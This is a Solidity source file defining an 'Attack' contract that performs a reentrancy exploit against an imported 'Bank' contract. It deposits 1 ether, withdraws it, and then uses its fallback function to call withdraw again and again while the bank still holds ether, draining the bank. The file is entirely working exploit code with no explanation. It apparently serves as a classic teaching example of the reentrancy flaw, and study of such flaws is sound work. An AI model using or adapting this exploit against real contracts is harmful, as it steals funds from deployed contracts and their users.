pragma solidity >=0.6.0 <0.7.0;

import "./Bank.sol";

contract Attack {
  Bank bank;

  constructor(Bank _bank) public {
    bank = Bank(_bank);
  }

  fallback() external payable {
    if (address(bank).balance >= 1 ether) {
      bank.withdraw(1 ether);
    }
  }

  function attack() public payable {
    bank.deposit{value: 1 ether}();
    bank.withdraw(1 ether);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}